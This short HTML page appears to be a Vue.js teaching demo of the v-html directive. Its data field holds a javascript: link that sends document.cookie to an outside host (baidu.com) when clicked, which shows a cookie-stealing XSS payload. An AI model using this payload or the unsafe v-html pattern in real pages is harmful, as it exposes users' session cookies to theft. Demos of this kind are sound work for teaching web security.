<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../vue.js"></script>
</head>

<body>
    <div id="root">
        <h1>{{name}}</h1>
        <h2 v-html="content"></h2>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: 'LWH',
                content: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>Hello!</a>'
            }
        })
    </script>
</body>

</html>
